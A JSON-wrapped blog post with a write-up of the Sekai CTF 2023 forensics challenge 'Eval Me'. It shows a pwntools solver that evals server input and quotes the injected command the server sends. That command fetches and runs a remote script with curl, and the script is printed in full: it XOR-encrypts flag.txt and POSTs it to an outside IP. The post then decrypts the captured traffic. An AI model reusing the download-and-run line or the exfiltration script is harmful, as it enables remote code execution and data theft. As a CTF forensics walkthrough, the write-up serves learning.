{"componentChunkName":"component---src-pages-blog-strapi-article-slug-tsx","path":"/blog/sekaictf-2023-eval-me/","result":{"data":{"allStrapiArticle":{"nodes":[{"id":"7885374d-c01a-5598-ace9-6c37af970dd3","slug":"sekaictf-2023-eval-me","title":"Sekai CTF 2023 - Eval Me (Forensics / 100P)","description":"Sekai CTF 2023 - organized by Project Sekai\nhttps://ctftime.org/event/1923/","content":{"data":{"content":"# Writeup\n\n## Challenge Description\n`\nI was trying a beginner CTF challenge and successfully solved it. But it didn't give me the flag. Luckily I have this network capture. Can you investigate?\n`\n\nOkay lets investigate!\n\n\n## Investigation\nObserve the challenge by `netcat` first.   \n~~~bash\n❯ nc chals.sekai.team 9000\nWelcome to this intro pwntools challenge.\nI will send you calculations and you will send me the answer\nDo it 100 times within time limit and you get the flag :)\n\n3 + 3\n~~~\n\nOkay, now we know this challenge ask us to do 100 times math calculation. Also found that if we answer it too slow, the program will stop and need to retry from the beginning. So we write a python script to solve this challenge, by using `pwntools`:\n\n~~~python:solve.py\nfrom pwn import *\n\nr = remote('chals.sekai.team', 9000)\ni = 0\nwhile True:\n    raw_input = r.recv()\n    i = i + 1\n    print(i)\n    print(b'message: ' + raw_input)\n    split_raw_input = raw_input.split(b\"\\n\")\n    question = split_raw_input[len(split_raw_input) - 2]\n    print(question)\n    ans = eval(question)\n    print(ans)\n    r.send(bytes(str(ans) + \"\\n\", 'utf-8'))\n~~~\nThis is a simple script that use `eval` function calculate the math expression, and then sent back to the server.   \n\nHowever, the server will not give us the flag at the end (This also mention in the original challenge description)    \nWhen the program answer the 72th question, we get it from the console:\n~~~bash\nb'message: correct\\n__import__(\"subprocess\").check_output(\"(curl -sL https://shorturl.at/fgjvU -o extract.sh && chmod +x extract.sh && bash extract.sh && rm -f extract.sh)>/dev/null 2>&1||true\",shell=True)\\r#1 + 2  \n~~~\n\nThen we download the file from `https://shorturl.at/fgjvU`, it is an image called `kittens.png`, but actually a bash shell script, just rename it to `extract.sh` and open with any text editor to have a look (o･ω･o):\n~~~bash:extract.sh\n#!/bin/bash\n\nFLAG=$(cat flag.txt)\n\nKEY='s3k@1_v3ry_w0w'\n\n\n# Credit: https://gist.github.com/kaloprominat/8b30cda1c163038e587cee3106547a46\nAsc() { printf '%d' \"'$1\"; }\n\n\nXOREncrypt(){\n    local key=\"$1\" DataIn=\"$2\"\n    local ptr DataOut val1 val2 val3\n\n    for (( ptr=0; ptr < ${#DataIn}; ptr++ )); do\n\n        val1=$( Asc \"${DataIn:$ptr:1}\" )\n        val2=$( Asc \"${key:$(( ptr % ${#key} )):1}\" )\n\n        val3=$(( val1 ^ val2 ))\n\n        DataOut+=$(printf '%02x' \"$val3\")\n\n    done\n\n    for ((i=0;i<${#DataOut};i+=2)); do\n    BYTE=${DataOut:$i:2}\n    curl -m 0.5 -X POST -H \"Content-Type: application/json\" -d \"{\\\"data\\\":\\\"$BYTE\\\"}\" http://35.196.65.151:30899/ &>/dev/null\n    done\n}\n\nXOREncrypt $KEY $FLAG\n\nexit 0\n~~~\n\nHere we guess when we answer the question correctly, the server side will execute this bash shell and make some POST requests to  `35.196.65.151:30899`. \nWe can also see that the encryption key is `s3k@1_v3ry_w0w` which is hard-coded, and the encryption method is XOR cipher (to each characters from the flag).\n\nThis challenge also provide a file called `capture.pcapng` which is a Wireshark capture file. We can make use of this.   \n\nIn the filter bar, input `ip.dst == 35.196.65.151 && http` to only display HTTP traffic and destination address = `35.196.65.151` ,  so that unrelated traffic are filtered out, also remember to sort by time asc.    \nNow we can see all the traffic sent by that bash script.\n![ws-capture](https://www.cms.void-dojo.ninja/uploads/ws_05d9466764.png)\n\nFrom the POST request payload:\n~~~json\n{\n    \"data\": \"20\"\n}\n~~~\nOnly 2 bytes are sent in single request, and total 51 requests are sent.\nAfter joining all the data together, we have:\n```\n20 76 20 01 78 24 45 45 46 15 00 10 00 28 4b 41 19 32 43 00 4e 41 00 0b 2d 05 42 05 2c 0b 19 32 43 2d 04 41 00 0b 2d 05 42 28 52 12 4a 1f 09 6b 4e 00 0f\n\n# trim space\n20762001782445454615001000284b41193243004e41000b2d0542052c0b1932432d0441000b2d05422852124a1f096b4e000f\n```\n\n## Solve\nHere we are very close to the flag.   \nAccording to the bash script, the byte being sent has been encrypted. Luckily the bash script give us a hint (see the credit comment: https://gist.github.com/kaloprominat/8b30cda1c163038e587cee3106547a46).   \nFrom this URL we get the original encryption decryption method, but pay attention, this program cannot be used directly. We found that the encryption method used by this challenge is the modified version, so the decryption method also need to change. The changes are removing the md5 and base64 encode & decode process. Fill-in the code key `s3k@1_v3ry_w0w` (given by the encryption bash shell above). At the end we use this program to decrypt:\n\n~~~bash:program.sh\n#!/bin/bash\n\n# requirements:\n#\n# md5\n# cut\n# tr\n# base64\n#\n\nAsc() { printf '%d' \"'$1\"; }\nHexToDec() { printf '%d' \"0x$1\"; }\n\nXOREncrypt(){\n    local key=\"$1\" DataIn=\"$2\"\n    local ptr DataOut val1 val2 val3\n\n    for (( ptr=0; ptr < ${#DataIn}; ptr++ )); do\n\n        val1=$( Asc \"${DataIn:$ptr:1}\" )\n        val2=$( Asc \"${key:$(( ptr % ${#key} )):1}\" )\n\n        val3=$(( val1 ^ val2 ))\n\n        DataOut+=$(printf '%02x' \"$val3\")\n\n    done\n    printf '%s' \"$DataOut\"\n}\n\nXORDecrypt() {\n\n    local key=\"$1\" DataIn=\"$2\"\n    local ptr DataOut val1 val2 val3\n\n    local ptrs\n    ptrs=0\n\n    for (( ptr=0; ptr < ${#DataIn}/2; ptr++ )); do\n\n        val1=\"$( HexToDec \"${DataIn:$ptrs:2}\" )\"\n        val2=$( Asc \"${key:$(( ptr % ${#key} )):1}\" )\n\n        val3=$(( val1 ^ val2 ))\n\n        ptrs=$((ptrs+2))\n\n        DataOut+=$( printf \\\\$(printf \"%o\" \"$val3\") )\n\n    done\n    printf '%s' \"$DataOut\"\n}\n\nOperation=\"$1\"\n\nCodeKey=\"s3k@1_v3ry_w0w\"\n\nread -r teststring\n\nif [ \"$Operation\" == \"enc\" ] || [ \"$Operation\" == \"encrypt\" ]; then\n    teststring=\"$( echo \"$teststring\" )\"\n    XOREncrypt \"$CodeKey\" \"$teststring\"\nelif [ \"$Operation\" == \"dec\" ] || [ \"$Operation\" == \"decrypt\" ]; then\n    XORDecrypt \"$CodeKey\" \"$teststring\"\nfi\n~~~\n\n~~~bash\n./program.sh decrypt\n20762001782445454615001000284b41193243004e41000b2d0542052c0b1932432d0441000b2d05422852124a1f096b4e000f\n\nSEKAI{3v4l_g0_8rrrr_8rrrrrrr8rrrrrrrrrrr!!!_8483} \n~~~\nP.S. Zsh will not work, please use bash !   \n\nFinally we have the flag `SEKAI{3v4l_g0_8rrrr_8rrrrrrr8rrrrrrrrrrr!!!_8483}` ヽ(・∀・)ﾉ"}},"updatedAt":"2024-01-25T10:36:13.767Z","publishedAt":"2024-01-25T10:36:13.765Z","tags":[{"name":"forensics","color":"blue"}],"categories":[{"name":"ctf","color":"red"}],"cover":{"formats":{"thumbnail":{"url":"/uploads/thumbnail_sekaictflogobanner_2095bffa1f.jpg"},"small":{"url":"/uploads/small_sekaictflogobanner_2095bffa1f.jpg"}}}}]}},"pageContext":{"id":"7885374d-c01a-5598-ace9-6c37af970dd3","slug":"sekaictf-2023-eval-me","__params":{"slug":"sekaictf-2023-eval-me"}}},"staticQueryHashes":["3001278788"],"slicesMap":{}}